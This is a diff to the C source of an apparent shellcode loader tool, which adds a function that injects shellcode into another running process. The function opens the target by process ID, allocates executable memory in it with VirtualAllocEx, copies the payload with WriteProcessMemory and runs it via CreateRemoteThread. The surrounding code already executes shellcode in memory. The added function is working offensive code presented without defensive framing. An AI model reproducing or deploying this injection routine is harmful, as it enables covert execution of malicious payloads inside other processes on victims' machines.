@@ -23,12 +23,14 @@ Web: https://github.com/govolution/bfg
 #include <string.h>
 #include <windows.h>
 #include <tchar.h>
+//#include <tlhelp32.h>
 #include "defs.h"
 
 int get_filesize(char *fvalue);
 unsigned char* load_file(char *fvalue, unsigned char *buf, int size2);
 void exec_shellcode(unsigned char *shellcode);
 void exec_shellcode64(unsigned char *shellcode);
+DWORD inject_sc_process(unsigned char *shellcode, DWORD pid);
 
 int main (int argc, char **argv)
 {
@@ -189,6 +191,54 @@ void exec_shellcode64(unsigned char *shellcode)
 	DWORD l=0;
 	VirtualProtect(shellcode,len,PAGE_EXECUTE_READWRITE,&l);
 	(* (int(*)()) shellcode)();
+}
+#endif
+
+#ifdef INJECT_SHELLCODE
+#define CREATE_THREAD_ACCESS (PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ)
+DWORD inject_sc_process(unsigned char *shellcode, DWORD pid)
+{
+	PBYTE pShellcode = shellcode;
+	//SIZE_T szShellcodeLength=272;
+	SIZE_T szShellcodeLength = strlen(shellcode);
+	HANDLE hProc;
+	HANDLE hRemoteThread;
+	PVOID pRemoteBuffer;
+	DWORD dwProcessID = pid;
+	printf("%d\n",dwProcessID);
+
+	int i;
+	printf("size: %i\n", szShellcodeLength);
+
+	for (i=0;i<20;i++) 
+	{	
+		printf("0x%02x", pShellcode[i]);
+	}
+	printf("\n");
+
+	if(!dwProcessID) {
+		return 1;
+	}
+	hProc = OpenProcess(CREATE_THREAD_ACCESS, FALSE, dwProcessID);
+	if(!hProc) {
+		return 2;
+	}
+
+	pRemoteBuffer = VirtualAllocEx(hProc, NULL, szShellcodeLength, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
+	if (!pRemoteBuffer) {
+		return 4;
+	}
+	if (!WriteProcessMemory(hProc, pRemoteBuffer, pShellcode, szShellcodeLength, NULL)) {
+		return 5;
+	}
+
+	hRemoteThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteBuffer, NULL, 0, NULL);
+	if (!hRemoteThread) {
+		return 6;
+	}
+	CloseHandle(hProc);
+
+	return 0;	
 }
 #endif
 
